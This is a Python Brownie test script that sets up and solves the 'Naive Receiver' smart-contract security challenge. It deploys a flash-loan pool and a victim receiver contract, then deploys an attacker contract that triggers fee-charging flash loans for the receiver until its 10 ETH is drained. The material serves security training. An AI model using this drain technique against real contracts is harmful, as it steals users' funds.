from scripts.utils import *
from brownie import NaiveReceiverLenderPool, FlashLoanReceiver

def test_solve_challenge():
    ####################################################################
    ######### SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE #########
    ####################################################################

    # tokens in pool and tokens in receiver
    ETHER_IN_POOL = ether_to_wei(1000)
    ETHER_IN_RECEIVER = ether_to_wei(10)

    # import accounts
    deployer, _fromDeployer, attacker, _fromAttacker, some_user, _fromSomeUser = define_from_acc(qty=3)

    # deploy the contracts
    pool = NaiveReceiverLenderPool.deploy(_fromDeployer)

    # fund the pool
    deployer.transfer(pool.address, ETHER_IN_POOL)

    # confirm the balances are correct
    assert pool.balance() == ETHER_IN_POOL
    assert pool.fixedFee() == ether_to_wei(1)

    # deploy flash loan receiver
    receiver = FlashLoanReceiver.deploy(pool.address, _fromDeployer)

    # fund the receiver
    deployer.transfer(receiver.address, ETHER_IN_RECEIVER)

    # confirm the balances are correct
    assert receiver.balance() == ETHER_IN_RECEIVER

    # check if solved
    def check_solution():
        ############################################
        ############ SUCCESS CONDITIONS ############
        ############################################

        # All ETH has been drained from the receiver
        assert receiver.balance() == 0
        assert pool.balance() == ETHER_IN_POOL + ETHER_IN_RECEIVER

# #########################################################
# There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.
#
# You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.
#
# Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;) 
# #########################################################

    ##############################
    ##### SOLUTION GOES HERE #####
    ##############################

    # import the attacker contract
    from brownie import NaiveReceiverAttack

    # deploy attacker contract which calls `flashLoan` to the receiver 10 times in a loop
    attacker_contract = NaiveReceiverAttack.deploy(receiver.address, pool.address, _fromAttacker)

    # call `attack()` to start the attack
    attacker_contract.attack(_fromAttacker)

    ######################
    check_solution()
